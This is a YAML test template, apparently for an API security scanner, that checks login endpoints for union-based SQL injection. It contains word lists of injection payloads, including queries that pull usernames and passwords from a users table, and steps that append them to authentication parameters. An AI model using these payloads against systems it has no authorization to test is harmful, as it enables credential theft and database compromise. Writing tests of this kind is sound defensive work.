id: SMART_BASIC_UNION_BASED_SQLI
info:
  name: Basic Union based SQL Injection - Smart Testing
  description: Smart testing for Union-Based SQL Injection vulnerabilities. Detects when applications fail to properly validate and sanitize input parameters, allowing attackers to manipulate SQL queries using UNION operators to extract sensitive data.
  details: Tests for Union-Based SQL Injection by intelligently injecting UNION SELECT statements into authentication parameters across different HTTP methods. The system detects vulnerabilities by testing column count detection, data extraction, and negative-based injection techniques.
  impact: Unauthorized database access, sensitive data extraction, authentication bypass, user credential theft, complete system compromise, and potential data manipulation.
  category:
    name: NO_AUTH
    shortName: Broken Authentication
    displayName: Broken User Authentication (BUA)
  subCategory: SMART_BASIC_UNION_BASED_SQLI
  severity: MEDIUM
  agenticTestingAllowed: true
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  references:
    - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/
    - https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md
    - https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
  cwe:
    - CWE-287
  cve:
    - CVE-2020-24008
    - CVE-2021-45901

attributes:
  nature: INTRUSIVE
  plan: PRO
  duration: FAST

api_selection_filters:
  response_code:
    gte: 200
    lt: 300
  response_payload:
    length:
      gt: 0
    not_contains:
      - Error
      - Internal Server
      - Failed
      - Unauthorized
      - access denied
      - Forbidden
      - Method Not allowed
      - Gateway timeout
      - request timeout
      - server error
      - server busy
      - authentication error
      - authorization error
      - validation error
      - Permission Denied
      - invalid token
      - token expired
      - session expired
      - session timeout
      - unexpected error
      - unable to process request
      - bad request
      - service unavailable
      - account is locked
      - account is blocked
      - multiple failed attempts
      - "<html>"
      - "</html>"
  or:
    - url:
        contains_either:
          - login
          - signin
          - authenticate
          - auth
    - request_payload:
        for_one:
          key:
            regex: "username|^user$|^userid$|^user_id$|^login$|email|^account$"
            extract: authKey
          value:
            extract: authValue
    - query_param:
        for_one:
          key:
            regex: "username|^user$|^userid$|^user_id$|^login$|email|^account$"
            extract: authKey
          value:
            extract: authValue

wordLists:
  unionBasedPayloads:
    - "' UNION SELECT null, null--"
    - "' UNION SELECT null, null, null--"
    - "' UNION SELECT null, null, null, null--"
    - "' UNION SELECT null, null, null, null, null--"
    - "' UNION SELECT 1, 'username', 'password' FROM users--"
    - "' UNION SELECT null, username, password FROM users--"
    - "' UNION ALL SELECT null, null, null--"
    - "' UNION ALL SELECT 1, 'admin', 'password'--"
    - "' UNION SELECT 1, 'abc', 'def', null, null--"
    - "' UNION SELECT username, password FROM users--"
  unionNegativeBasedPayloads:
    - "' UNION SELECT null, null WHERE 1=0--"
    - "' UNION SELECT null, null, null WHERE 1=0--"
    - "' UNION SELECT null, null, null, null WHERE 1=0--"
    - "' UNION SELECT null, null, null, null, null WHERE 1=0--"
    - "' UNION SELECT 1, 'username', 'password' FROM users WHERE 1=0--"
    - "' UNION SELECT null, username, password FROM users WHERE 1=0--"
    - "' UNION ALL SELECT null, null, null WHERE 1=0--"
    - "' UNION ALL SELECT 1, 'admin', 'password' WHERE 1=0--"
    - "' UNION SELECT 1, 'abc', 'def', null, null WHERE 1=0--"
    - "' UNION SELECT username, password FROM users WHERE 1=0--"
  commentPayloads:
    - "' UNION SELECT null, null#"
    - "' UNION SELECT null, null/*"
    - "' UNION SELECT null, null;--"

execute:
  type: multiple
  requests:
    - req:
        - modify_body_param:
            authKey: ${authValue}${unionBasedPayloads}
        - modify_query_param:
            authKey: ${authValue}${unionBasedPayloads}
        - validate:
            response_code:
              gte: 200
              lt: 300
            response_payload:
              length:
                gt: 0
              not_contains:
                - Error
                - Internal Server
                - Fail
                - Unauthorized
                - access denied
                - Forbidden
        - success: x1
        - failure: continue
    - req:
        - modify_body_param:
            authKey: ${authValue}${unionNegativeBasedPayloads}
        - modify_query_param:
            authKey: ${authValue}${unionNegativeBasedPayloads}
        - validate:
            response_code:
              gte: 200
              lt: 300
            response_payload:
              length:
                gt: 0
              not_contains:
                - Error
                - Unauthorized
                - access denied
        - success: x2
        - failure: continue
    - req:
        - modify_body_param:
            authKey: ${authValue}${commentPayloads}
        - modify_query_param:
            authKey: ${authValue}${commentPayloads}
        - validate:
            response_code:
              gte: 200
              lt: 300
            response_payload:
              length:
                gt: 0
        - success: vulnerable

